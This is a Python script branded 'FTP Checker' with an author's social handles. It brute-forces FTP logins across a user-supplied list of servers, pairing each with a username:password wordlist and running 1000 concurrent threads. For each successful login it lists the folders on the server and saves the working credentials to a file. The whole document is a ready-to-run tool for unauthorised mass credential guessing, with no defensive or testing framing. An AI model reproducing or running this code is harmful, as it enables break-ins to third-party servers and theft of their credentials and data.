import ftplib
import concurrent.futures


print('''
|       ||       ||       |                                     
|    ___||_     _||    _  |                                     
|   |___   |   |  |   |_| |                                     
|    ___|  |   |  |    ___|                                     
|   |      |   |  |   |                                         
|___|      |___|  |___|                                         
 _______  __   __  _______  _______  ___   _  _______  ______   
|       ||  | |  ||       ||       ||   | | ||       ||    _ |  
|       ||  |_|  ||    ___||       ||   |_| ||    ___||   | ||  
|       ||       ||   |___ |       ||      _||   |___ |   |_||_ 
|      _||       ||    ___||      _||     |_ |    ___||    __  |
|     |_ |   _   ||   |___ |     |_ |    _  ||   |___ |   |  | |
|_______||__| |__||_______||_______||___| |_||_______||___|  |_|
                
   by: nouredine kn
   telegram: nouredine_kn
   github: https://github.com/nouredinekn
''')
# Configuration
FTP_PORT = 21
TIMEOUT = 5  # Timeout for each connection attempt
THREADS = 1000  # Number of concurrent threads
FTP_LIST_FILE = input("FTP_LIST_FILE .txt: ")  # List of FTP servers (IP or domain)
USERPASS_FILE = "userpass-ftp.txt"  # List of username:password pairs
OUTPUT_FILE = "valid_ftp_credentials.txt"
SUCCESS = []

# Read data from file
def read_file(file_path):
    try:
        with open(file_path, "r",encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File '{file_path}' not found.")
        return []

# Attempt FTP login and get folders
def check_ftp_login(ip, userpass):
    try:
        username, password = userpass.split(":", 1)
        ftp = ftplib.FTP()
        ftp.connect(ip, FTP_PORT, timeout=TIMEOUT)
        ftp.login(username, password)
        
        # Get list of directories only
        items = ftp.nlst()  # Get all items
        folders = []
        
        for item in items:
            try:
                ftp.cwd(item)  # Try changing directory
                folders.append(item)  # If successful, it's a folder
                ftp.cwd("..")  # Go back to parent directory
            except:
                continue  # Not a folder, skip
        
        if folders:  # Save only if there are folders
            print(f"[+] SUCCESS: {ip} - {username}:{password} (Folders: {folders})")
            if ip not in SUCCESS: 
                SUCCESS.append(ip)
                with open(OUTPUT_FILE, "a",encoding="utf-8") as f:
                    f.write(f"{ip} - {username}:{password} (Folders: {folders})\n")  # Append instead of overwrite
        
        ftp.quit()
    except ftplib.error_perm:
        pass  # Incorrect login credentials
    except Exception as e:
        print(f"[!] Error checking {ip}: {e}")

# Brute-force FTP servers
def brute_force_ftp(ip):
    for userpass in userpass_list:
        check_ftp_login(ip, userpass)

# Main function using multithreading
def main():
    global userpass_list
    userpass_list = read_file(USERPASS_FILE)
    ftp_servers = read_file(FTP_LIST_FILE)
    
    if not userpass_list or not ftp_servers:
        print("[!] Missing required data. Check input files.")
        return

    print(f"[*] Testing {len(ftp_servers)} FTP servers with {len(userpass_list)} credential pairs...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        executor.map(brute_force_ftp, ftp_servers)

if __name__ == "__main__":
    main()
